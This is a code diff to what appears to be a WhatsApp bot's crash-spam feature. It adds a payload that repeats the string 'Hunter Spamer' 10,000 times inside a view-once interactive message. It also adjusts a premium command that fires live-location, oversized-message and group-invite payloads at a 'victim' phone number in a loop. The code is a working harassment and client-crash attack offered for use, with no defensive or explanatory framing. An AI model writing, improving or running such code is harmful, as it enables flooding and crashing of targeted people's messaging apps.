@@ -207,7 +207,7 @@ async function grpinv(target) {
     const groupJid = '120363219043828032@g.us';
     const inviteCode = 'rqMf3nmvtyTmg93b';
     const inviteExpiration = 1731711671;
-    const groupName = `${xeontext1}`;
+    const groupName = `${xeontext7}`;
     const caption = `${xeontext1}`;
 
     const jpegThumbnail = null;
@@ -232,12 +232,13 @@ async function grpinv(target) {
 
 
 async function home(target) {
-    await XeonBotInc.relayMessage(target, {
+	let msgnull = "⋆✩⋆ Hunter Spamer ⋆✩⋆".repeat(10000);
+	await XeonBotInc.relayMessage(target, {
         viewOnceMessage: {
             message: {
                 interactiveResponseMessage: {
                     body: {
-                        text: "⋆✩⋆ Hunter Spamer ⋆✩⋆",
+                        text: msgnull,
                         format: "EXTENSIONS_1"
                     },
                     nativeFlowResponseMessage: {
@@ -2476,7 +2477,7 @@ if (!isPremium) return replygcxeon(mess.prem)
  if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 212xxxxxxxx`)
   victim = text.split("|")[0]+'@s.whatsapp.net'
   await replygcxeon(`In process....`)
-  for (let i = 0; i < 50; i++) {
+  for (let i = 0; i < 1; i++) {
   sendLiveLocationMessage(victim)
   home(victim)
   grpinv(victim)
